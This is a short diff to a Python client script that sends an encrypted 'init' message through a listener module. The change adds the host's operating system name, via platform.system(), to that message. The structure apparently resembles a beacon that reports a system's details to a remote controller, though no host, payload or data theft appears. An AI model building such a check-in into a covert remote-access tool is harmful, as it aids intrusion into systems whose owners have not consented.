@@ -4,6 +4,8 @@ from listener.communication import Communication
 from listener.cipher import Cipher
 from tools.env import EnvReader
 import json
+import os
+import platform
 
 
 def main():
@@ -19,7 +21,8 @@ def main():
 
     listener.init_send(json.dumps({
         "type": "init",
-        "commands": "setup done"
+        "action": "setup done",
+        "params": f"{platform.system()}"
     }).encode('utf-8'))
 
     sleep(2)
